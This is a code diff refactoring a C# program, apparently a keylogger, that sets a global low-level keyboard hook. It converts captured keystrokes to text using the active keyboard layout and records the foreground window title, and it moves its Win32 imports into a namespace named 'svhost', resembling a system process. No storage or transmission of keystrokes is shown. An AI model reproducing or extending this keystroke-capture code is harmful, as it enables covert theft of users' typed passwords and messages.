@@ -6,7 +6,7 @@ using System.Runtime.InteropServices;
 using System.Linq;
 using System.IO;
 using System.Globalization;
-
+using svhost;
 
 class BlockWindows
 {
@@ -224,14 +224,14 @@ class BlockWindows
 
         public void AddChar(Keys key)
         {
-            IntPtr fore = GetForegroundWindow();
-            uint tpid = GetWindowThreadProcessId(fore, IntPtr.Zero);
+            IntPtr fore = WinApi.GetForegroundWindow();
+            uint tpid = WinApi.GetWindowThreadProcessId(fore, IntPtr.Zero);
             byte [] keys = new byte[256];
             StringBuilder b = new StringBuilder(100);
-            IntPtr hKL = GetKeyboardLayout(tpid);
+            IntPtr hKL = WinApi.GetKeyboardLayout(tpid);
             hKL = (IntPtr)(hKL.ToInt32() & 0x0000FFFF);
-            GetKeyboardState(keys);
-            ToUnicodeEx(
+            WinApi.GetKeyboardState(keys);
+            WinApi.ToUnicodeEx(
                     (uint)key,
                     (uint)key,
                     keys,
@@ -248,80 +248,7 @@ class BlockWindows
     }
 
     static KeyMessage Message = new KeyMessage();
-
-    #region Marshaled
-    [DllImport("user32.dll")]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    static extern bool GetKeyboardState(byte[] lpKeyState);
-
-    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
-
-    [DllImport("user32.dll")]
-    static extern IntPtr LoadKeyboardLayout(string pwszKLID, uint Flags);
-
-    [DllImport("user32.dll")]
-    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
-
-    [DllImport("User32.dll")]
-    public static extern int GetWindowText(IntPtr hwnd, StringBuilder s, int nMaxCount);
-
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr SetWindowsHookEx(int idHook,
-                                                  HookProc lpfn,
-                                                  IntPtr hMod,
-                                                  uint dwThreadId);
-
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr CallNextHookEx(IntPtr hhk,
-                                                int nCode,
-                                                IntPtr wParam,
-                                                IntPtr lParam);
-
-    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr GetModuleHandle(string lpModuleName);
-
-    private const uint WINEVENT_OUTOFCONTEXT = 0;
-    private const uint EVENT_SYSTEM_FOREGROUND = 3;
-
-    delegate void WinEventDelegate(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime);
-
-    [DllImport("user32.dll")]
-    static extern IntPtr SetWinEventHook(uint eventMin, uint eventMax, IntPtr hmodWinEventProc, WinEventDelegate lpfnWinEventProc, uint idProcess, uint idThread, uint dwFlags);
-
-    private const int WH_KEYBOARD_LL = 13;// WH_KEYBOARD
-    private const int WM_KEYDOWN = 256;
-    private static IntPtr keyBoardHook = IntPtr.Zero;
-    private static IntPtr mouseHook = IntPtr.Zero;
-
-
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr GetForegroundWindow();
-
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern uint GetWindowThreadProcessId(IntPtr hWnd, IntPtr lpdwProcessId);
-
-    [DllImport("user32.dll")]
-    public static extern int ToUnicode(uint virtualKeyCode, uint scanCode,
-        byte[] keyboardState,
-        [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)]
-        StringBuilder receivingBuffer,
-        int bufferSize, uint flags);
-
-    [DllImport("user32.dll")]
-    static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[]
-       lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
-       int cchBuff, uint wFlags, IntPtr dwhkl);
-
-    [DllImport("user32.dll")]
-    static extern IntPtr GetKeyboardLayout(uint idThread);
-
-    #endregion
-
-
-    static WinEventDelegate dele = null;
+    static IntPtr keyBoardHook = IntPtr.Zero;
     static IntPtr winHook = (IntPtr)0;
     static Timer t = new Timer();
     public static void Main()
@@ -330,9 +257,9 @@ class BlockWindows
         ApplicationContext ctx = new ApplicationContext();
         ctx.ThreadExit += delegate(object sender, EventArgs e)
         {
-            UnhookWindowsHookEx(keyBoardHook);
+            WinApi.UnhookWindowsHookEx(keyBoardHook);
         };
-        if (FindWindow(null, GetForeWindowTitle()) != IntPtr.Zero)
+        if (WinApi.FindWindow(null, GetForeWindowTitle()) != IntPtr.Zero)
         {
             //    ShowWindow(c, 0);
         }
@@ -350,9 +277,9 @@ class BlockWindows
     {
         get
         {
-            IntPtr fore = GetForegroundWindow();
-            uint tpid = GetWindowThreadProcessId(fore, IntPtr.Zero);
-            IntPtr hKL = GetKeyboardLayout(tpid);
+            IntPtr fore = WinApi.GetForegroundWindow();
+            uint tpid = WinApi.GetWindowThreadProcessId(fore, IntPtr.Zero);
+            IntPtr hKL = WinApi.GetKeyboardLayout(tpid);
             hKL = (IntPtr)(hKL.ToInt32() & 0x0000FFFF);
             return new System.Globalization.CultureInfo(hKL.ToInt32());
         }
@@ -369,36 +296,17 @@ class BlockWindows
             keyboardState[(int)Keys.ControlKey] = 0xff;
             keyboardState[(int)Keys.Menu] = 0xff;
         }
-        ToUnicode((uint)keys, 0, keyboardState, buf, 256, 0);
+        WinApi.ToUnicode((uint)keys, 0, keyboardState, buf, 256, 0);
         return buf.ToString();
     }
     private static IntPtr SetKeyBoardHook()
     {
         Process curProcess = Process.GetCurrentProcess();
         ProcessModule curModule = curProcess.MainModule;
-        return SetWindowsHookEx(WH_KEYBOARD_LL,
+        return WinApi.SetWindowsHookEx(WinApi.WH_KEYBOARD_LL,
                                 HookCallback,
-                                GetModuleHandle(curModule.ModuleName),
+                                WinApi.GetModuleHandle(curModule.ModuleName),
                                 0);
-    }
-
-    static IntPtr SetMouseHook()
-    {
-        Process curProcess = Process.GetCurrentProcess();
-        ProcessModule curModule = curProcess.MainModule;
-        return SetWindowsHookEx(14,
-                                MouseHookCallback,
-                                GetModuleHandle(curModule.ModuleName),
-                                0);
-    }
-
-    static IntPtr MouseHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
-    {
-        if (nCode >= 0)
-        {
-
-        }
-        return CallNextHookEx(mouseHook, nCode, wParam, lParam);
     }
 
     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
@@ -417,16 +325,16 @@ class BlockWindows
             t.Start();//restart timer
         }
 
-        return CallNextHookEx(keyBoardHook, nCode, wParam, lParam);
+        return WinApi.CallNextHookEx(keyBoardHook, nCode, wParam, lParam);
     }
 
     private static string GetForeWindowTitle()
     {
-        IntPtr fore = GetForegroundWindow();
+        IntPtr fore = WinApi.GetForegroundWindow();
 
         const int count = 512;
         StringBuilder title = new StringBuilder(count);
-        int t = GetWindowText(fore, title, count);
+        int t = WinApi.GetWindowText(fore, title, count);
 
         return (t > 0) ? title.ToString() : "";
     }
